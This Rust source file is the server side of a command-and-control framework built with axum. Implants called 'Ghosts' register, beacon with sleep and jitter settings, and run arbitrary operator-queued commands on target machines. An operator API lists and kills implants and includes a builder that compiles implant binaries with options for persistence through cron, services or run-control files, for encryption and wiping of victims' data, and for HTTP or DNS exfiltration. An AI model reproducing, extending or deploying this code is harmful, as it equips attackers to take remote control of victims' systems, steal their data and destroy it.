use axum::{
    extract::{State, Path},
    routing::{get, post},
    Json, Router
};
use dashmap::DashMap;
use serde::{Deserialize, Serialize};
use std::sync::Arc;
use std::process::Stdio;
use tokio::process::Command;
use uuid::Uuid;
use tower_http::services::ServeDir;

// === ENUMS ===
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "lowercase")]
pub enum TaskStatus {
    Pending,
    Sent,
    Done,
    Failed
}

// === STRUCTS ===
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Ghost {
    pub id: String,         // UUID v7
    pub hostname: String,   // system hostname of machine on which the implant resides
    pub os: String,         // operating system
    pub sleep_interval: Option<i64>,
    pub jitter_percent: Option<i16>,
    pub update_pending: Option<bool>,
    pub last_seen: Option<i64>  // unix timestamp
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct GhostConfig {
    pub sleep_interval: i64,
    pub jitter_percent: i16
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Task {
    pub id: String,         // UUID v7
    pub command: String,    // exact command to be executed on target system
    pub args: String,       // arguments for the above command
    pub status: TaskStatus,
    pub result: Option<String>
}

#[derive(Serialize, Deserialize)]
pub struct HeartbeatRequest {
    pub id: String,
    pub results: Option<Vec<TaskResult>>
}

#[derive(Serialize, Deserialize)]
pub struct TaskResult {
    pub task_id: String,
    pub status: TaskStatus,
    pub output: String
}

#[derive(Serialize, Deserialize)]
pub struct HeartbeatResponse {
    pub sleep_interval: i64,
    pub jitter_percent: i16,
    pub tasks: Option<Vec<TaskDefinition>>
}

#[derive(Serialize, Deserialize)]
pub struct TaskDefinition {
    pub id: String,
    pub command: String,
    pub args: String
}

#[derive(Deserialize)]
pub struct TaskRequest {
    pub command: String,
    pub args: String
}

// === BUILDER ===
#[derive(Deserialize, Debug)]
pub struct GhostBuildRequest {
        pub target_url: String,
        pub target_port: String,
        pub enable_debug: bool,

        // persistence
        pub enable_persistence: bool,
        pub persist_runcontrol: bool,
        pub persist_service: bool,
        pub persist_cron: bool,

        // impact
        pub enable_impact: bool,
        pub impact_encrypt: bool,
        pub impact_wipe: bool,

        // exfiltration
        pub enable_exfil: bool,
        pub exfil_http: bool,
        pub exfil_dns: bool
}

// === SHARED STATE ===
pub struct ServerState {
    pub ghosts: DashMap<String, Ghost>,
    pub pending_tasks: DashMap<String, Vec<Task>>,
    pub task_history: DashMap<String, Vec<Task>>
}

// === API handlers ===
// === GHOST
async fn handle_ghost_register(
    State(state): State<Arc<ServerState>>,
    Json(mut ghost): Json<Ghost>
) -> Json<String> {
    println!("GHOST registered: {} {} ({})", ghost.os, ghost.hostname, ghost.id);

    ghost.last_seen = Some(chrono::Utc::now().timestamp());
    state.ghosts.insert(ghost.id.clone(), ghost);

    Json("ACK".to_string())
}

async fn handle_ghost_heartbeat(
    State(state): State<Arc<ServerState>>,
    Json(req): Json<HeartbeatRequest>
) -> Json<HeartbeatResponse> {
    let mut current_sleep = -1;
    let mut current_jitter = -1;

    if let Some(mut ghost) = state.ghosts.get_mut(&req.id) {
        ghost.last_seen = Some(chrono::Utc::now().timestamp());

        current_sleep = ghost.sleep_interval.unwrap_or(5);
        current_jitter = ghost.jitter_percent.unwrap_or(1);

        if ghost.update_pending == Some(true) {
            println!("GHOST {} config updated", req.id);
            ghost.update_pending = Some(false);
        }
    } else {
        println!("ERROR unknown GHOST {} sent heartbeat", req.id);
    }

    if let Some(results) = req.results {
        if let Some(mut pending_list) = state.pending_tasks.get_mut(&req.id) {
            for r in results {
                if let Some(idx) = pending_list.iter().position(|t| t.id == r.task_id) {
                    let mut task = pending_list.remove(idx);

                    task.status = r.status;
                    task.result = Some(r.output);

                    println!("task {} completed by GHOST {}", r.task_id, req.id);
                    
                    state.task_history.entry(req.id.clone()).or_insert_with(Vec::new).push(task);
                }
            }
        }
    }

    let mut outgoing_tasks = Vec::new();

    if let Some(mut tasks) = state.pending_tasks.get_mut(&req.id) {
        for task in tasks.iter_mut().filter(|t| t.status == TaskStatus::Pending) {
            outgoing_tasks.push(TaskDefinition {
                id: task.id.clone(),
                command: task.command.clone(),
                args: task.args.clone()
            });

            task.status = TaskStatus::Sent;
        }
    }

    let response = HeartbeatResponse {
        sleep_interval: current_sleep,
        jitter_percent: current_jitter,
        tasks: if outgoing_tasks.is_empty() { None } else { Some(outgoing_tasks) }
    };

    Json(response)
}

async fn handle_ghost_upload() {
    todo!("ghost exfiltration todo")
}

// === CHARON
async fn handle_charon_list_ghosts(State(state): State<Arc<ServerState>>) -> Json<Vec<Ghost>> {
    let list: Vec<Ghost> = state.ghosts.iter().map(|e| e.value().clone()).collect();
    Json(list)
}

async fn handle_charon_get_ghost(
    Path(id): Path<String>,
    State(state): State<Arc<ServerState>>
) -> Json<Option<Ghost>> {
    let ghost = state.ghosts.get(&id).map(|e| e.value().clone());
    Json(ghost)
}

async fn handle_charon_update_ghost(
    Path(id): Path<String>,
    State(state): State<Arc<ServerState>>,
    Json(req): Json<GhostConfig>
) -> Json<String> {
    if let Some(mut ghost) = state.ghosts.get_mut(&id) {
        ghost.sleep_interval = Some(req.sleep_interval);
        ghost.jitter_percent = Some(req.jitter_percent);
        ghost.update_pending = Some(true);
    } else {
        println!("ERROR update for unknown GHOST with {}", id);
    }

    Json("OK".to_string())
}

async fn handle_charon_get_ghost_tasks(
    Path(id): Path<String>,
    State(state): State<Arc<ServerState>>
) -> Json<Vec<Task>> {
    let mut all_tasks = Vec::new();

    if let Some(history) = state.task_history.get(&id) {
        all_tasks.extend(history.value().clone());
    }

    if let Some(pending) = state.pending_tasks.get(&id) {
        all_tasks.extend(pending.value().clone());
    }

    Json(all_tasks)
}

async fn handle_charon_get_task_details(
    Path(task_id): Path<String>,
    State(state): State<Arc<ServerState>>
) -> Json<Option<Task>> {
    for entry in state.pending_tasks.iter() {
        if let Some(task) = entry.value().iter().find(|t| t.id == task_id) {
            return Json(Some(task.clone()));
        }
    }

    for entry in state.task_history.iter() {
        if let Some(task) = entry.value().iter().find(|t| t.id == task_id) {
            return Json(Some(task.clone()));
        }
    }

    Json(None)
}

async fn handle_charon_queue_task(
    Path(id): Path<String>,
    State(state): State<Arc<ServerState>>,
    Json(req): Json<TaskRequest>
) {
    let new_task = Task {
        id: Uuid::now_v7().to_string(),
        command: req.command,
        args: req.args,
        status: TaskStatus::Pending,
        result: None
    };

    println!("task {} queued for GHOST {}", new_task.id, id);

    state.pending_tasks.entry(id).or_insert_with(Vec::new).push(new_task);
}

async fn handle_charon_kill_ghost(
    Path(id): Path<String>,
    State(state): State<Arc<ServerState>>
) {
    let kill_task = Task {
        id: Uuid::now_v7().to_string(),
        command: "STOP_HAUNT".to_string(),
        args: "".to_string(),
        status: TaskStatus::Pending,
        result: None
    };

    println!("kill signal queued for GHOST {}", id);

    state.pending_tasks.entry(id).or_insert_with(Vec::new).push(kill_task);
}

// BUILDER
async fn handle_charon_build(
    State(_state): State<Arc<ServerState>>,
    Json(req): Json<GhostBuildRequest>
) -> Result<Json<String>, String> {
    println!("build requested for target {}:{}", req.target_url, req.target_port);
    
    let build_id = Uuid::now_v7().to_string();
    let source_path = std::env::var("GHOST_SOURCE_PATH").unwrap_or("/usr/src/GHOST".to_string());

    let build_base = std::env::var("SHADOW_BUILD_DIR").unwrap_or("builds".to_string());
    let build_dir = std::path::Path::new(&build_base).join(&build_id);

    tokio::fs::create_dir_all(&build_dir).await.map_err(|e| format!("fs error: {}", e))?;

    let mut args = vec![
        source_path,
        format!("-DSHADOW_URL={}", req.target_url),
        format!("-DSHADOW_PORT={}", req.target_port),
        format!("-DENABLE_DEBUG={}", if req.enable_debug { "ON" } else { "OFF" }),
        format!("-DENABLE_PERSISTENCE={}", if req.enable_persistence { "ON" } else { "OFF" }),
        format!("-DENABLE_IMPACT={}", if req.enable_impact { "ON" } else { "OFF" }),
        format!("-DENABLE_EXFIL={}", if req.enable_exfil { "ON" } else { "OFF" }),
    ];

    if req.enable_persistence {
        args.push(format!("-DPERSIST_RUNCONTROL={}", if req.persist_runcontrol { "ON" } else { "OFF" }));
        args.push(format!("-DPERSIST_SERVICE={}", if req.persist_service { "ON" } else { "OFF" }));
        args.push(format!("-DPERSIST_CRON={}", if req.persist_cron { "ON" } else { "OFF" }));
    }

    if req.enable_impact {
        args.push(format!("-DIMPACT_ENCRYPT={}", if req.impact_encrypt { "ON" } else { "OFF" }));
        args.push(format!("-DIMPACT_WIPE={}", if req.impact_wipe { "ON" } else { "OFF" }));
    }

    if req.enable_exfil {
        args.push(format!("-DEXFIL_HTTP={}", if req.exfil_http { "ON" } else { "OFF" }));
        args.push(format!("-DEXFIL_DNS={}", if req.exfil_dns { "ON" } else { "OFF" }));
    }

    println!("runnin cmake in {:?}", build_dir);
    let cmake_output = Command::new("cmake")
        .current_dir(&build_dir)
        .args(&args)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .output()
        .await
        .map_err(|e| format!("cmake failed {}", e))?;

    if !cmake_output.status.success() {
        let err_msg = String::from_utf8_lossy(&cmake_output.stderr);

        return Err(format!("cmake failed {}", err_msg));
    }

    println!("running make in {:?}", build_dir);
    let make_output = Command::new("make")
        .current_dir(&build_dir)
        .arg("-j4")     // multithread, why not
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .output()
        .await
        .map_err(|e| format!("make failed {}", e))?;

    if !make_output.status.success() {
        let err_msg = String::from_utf8_lossy(&make_output.stderr);

        return Err(format!("make failed {}", err_msg));
    }

    // TODO fix path to not use bin/ghost uwu 
    let download_path = format!("/api/v1/ghost/download/{}/bin/Ghost", build_id);

    println!("build success. available at {}", download_path);
    Ok(Json(download_path))
}

pub fn app(state: Arc<ServerState>) -> Router {
    let build_base = std::env::var("SHADOW_BUILD_DIR").unwrap_or("builds".to_string());
    let serve_dir = ServeDir::new(build_base);

    let ghost_routes = Router::<Arc<ServerState>>::new()
        .route("/register", post(handle_ghost_register))        // ghost init (register)
        .route("/heartbeat", post(handle_ghost_heartbeat))      // ghosts will beacon to get tasks from here (or will just beacon their status and get back whether or not they have a task; smth to think about)
        .route("/upload", post(handle_ghost_upload))            // exfiltration endpoint for data dumps
        .nest_service("/download", serve_dir);

    let charon_routes = Router::<Arc<ServerState>>::new()
        .route("/ghosts", get(handle_charon_list_ghosts))               // list active GHOSTs
        .route("/ghosts/{id}", get(handle_charon_get_ghost).post(handle_charon_update_ghost))   // get details about a GHOST or update its config
        .route("/ghosts/{id}/task", post(handle_charon_queue_task))     // assign a task to GHOST
        .route("/ghosts/{id}/tasks", get(handle_charon_get_ghost_tasks))    // get all tasks for GHOST
        .route("/tasks/{id}", get(handle_charon_get_task_details))      // get single task details
        .route("/ghosts/{id}/kill", post(handle_charon_kill_ghost))    // killswitch for GHOST
        .route("/build", post(handle_charon_build));

    // init router with route -> handler mapping
    Router::<Arc<ServerState>>::new()
        .route("/health", get(|| async { "OK" }))
        .nest("/api/v1/ghost", ghost_routes)
        .nest("/api/v1/charon", charon_routes)
        .with_state(state)
}
